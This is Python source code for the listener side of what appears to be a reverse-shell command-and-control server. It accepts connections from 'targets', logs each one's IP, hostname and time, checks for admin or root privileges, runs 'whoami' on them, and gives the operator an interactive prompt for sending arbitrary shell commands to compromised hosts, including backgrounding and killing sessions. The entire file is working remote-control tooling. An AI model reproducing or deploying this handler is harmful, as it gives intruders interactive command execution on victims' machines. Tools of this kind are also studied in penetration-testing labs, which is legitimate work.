import socket
import threading
import time
from datetime import datetime

class Server:
    def __init__(self):
        self.is_listening = False
        self.current_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host_ip = ""
        self.host_port = 0
        self.list_of_targets = []

    def prepare_socket_thread(self, input_ip, input_port):
        self.current_socket.bind((input_ip, int(input_port)))
        print("[+] Awaiting connection from client...\n")
        self.current_socket.listen()
        t1 = threading.Thread(target=self.welcome_new_connection)
        t1.start()

    # TODO épurer et diviser en sous-méthodes
    def welcome_new_connection(self):
        while True:
            try:
                new_target, new_ip = self.current_socket.accept()
                admin_message = self.recieve_message(new_target)
                is_admin = False
                print(admin_message)
                if (admin_message.split()[0] == "Linux") and (admin_message.split()[1] == "0"):
                    is_admin = True
                elif admin_message == "1":
                    is_admin = True
                hour_of_connection = time.strftime("%H:%M:%S", time.localtime())
                date_of_connection = datetime.now()
                time_record = (f"{date_of_connection.day}/{date_of_connection.month}/{date_of_connection.year} {hour_of_connection}")
                try:
                    hostname = socket.gethostbyaddr(new_ip[0])[0]
                except Exception:
                    print(f"\n[-] Couldn't resolve hostname for client {new_ip[0]}.")
                    hostname = "[unresolved]"
                # TODO Change this data structure to make it more explicit ?
                self.list_of_targets.append([new_target, new_ip[0], time_record, hostname, is_admin])
                self.get_last_client_username()
                print(f"\n[+] Connection recieved from {new_ip[0]}.")
                print(f"    \___ time of connection : {time_record}")
                print(f"    \___ port used on the client : {new_ip[1]}\n\n(listening) Enter_command#> ", end="")
            except Exception:
                if self.is_listening:
                    self.current_socket.close()
                break
    
    def handle_single_target_communication(self, target_index):
        target_id = self.list_of_targets[target_index][0]
        target_ip = self.list_of_targets[target_index][1]
        user_id = self.list_of_targets[target_index][5]
        while True:
            try:
                message = input(f"{user_id}@{target_ip}#> ")
                # void command
                if message == "":
                    pass
                # background command  
                if message == "bg":
                    print("\n[+] Moving current session to the background.\n")
                    break 
                # exit command
                if message == "exit":
                    self.send_message(target_id, message)
                    print("\n[-] sending kill signal...")
                    target_id.close()
                    del self.list_of_targets[target_index]
                    print("[-] Connection closed.\n")
                    break     
                # commands to be sent to client
                else :      
                    self.send_message(target_id, message)
                    response = self.recieve_message(target_id)
                    if response == "exit":
                        print("[-] The client has terminated the session.")
                        target_id.close()
                        del self.list_of_targets[target_index]
                        break
                    print(response)
            except KeyboardInterrupt:
                print("\n\nKeyboard interrupt issued.\n")
                self.send_message(target_id, "exit")
                print("\n[-] sending kill signal...")
                target_id.close()
                del self.list_of_targets[target_index]
                print("[-] Connection closed.\n")
                break
            except Exception:
                self.current_socket.close()
                break

    def reset(self):
        self.current_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def send_message(self, target_id, message):
        message = str(message)
        target_id.send(message.encode())
    
    def recieve_message(self, target_id) :
        response = target_id.recv(4096).decode(errors="replace")
        return response
    
    def get_last_client_username(self):
        target_id = self.list_of_targets[-1][0]
        target_ip = self.list_of_targets[-1][1]
        self.send_message(target_id, "whoami")
        user_id = self.recieve_message(target_id).rstrip("\n")
        if len(user_id.split()) > 5:
            print(f"[-] Warning : couldn't resolve user id for {target_ip}.\n")
            user_id = "[unresolved]"
        self.list_of_targets[-1].append(user_id) 

    def close_all_connections(self):
        print("\n[-] Closing...\n")
        for target in self.list_of_targets:
            self.send_message(target[0], "exit")
        self.current_socket.close()
    
